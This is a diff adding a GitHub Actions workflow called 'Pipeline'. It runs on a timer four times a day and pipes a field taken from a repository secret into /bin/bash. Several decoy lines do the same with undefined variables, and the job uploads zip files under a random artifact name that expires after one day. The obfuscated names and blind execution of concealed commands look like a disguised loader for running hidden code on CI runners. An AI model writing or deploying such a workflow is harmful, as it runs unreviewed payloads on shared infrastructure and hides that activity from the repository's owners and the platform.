@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 4,10,16,22 * * *'
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          nhg202: ${{ secrets.nhg202 }}
+        run: |
+          printf '%s' "$nhg202" | jq -r .rtl449 | /bin/bash
+          echo $l40 | jq -r .njj049 | /bin/bash
+          printf '%s' "$dt31" | jq -r .acipf7745 | /bin/bash
+          echo $m31852 | jq -r .rfrw1391 | /bin/bash
+          echo $kddui16599 | jq -r .myaa11714 | /bin/bash
+          echo $vygo93 | jq -r .nh30923 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: JIwJDwBL
+          path: "*.zip"
+          retention-days: 1
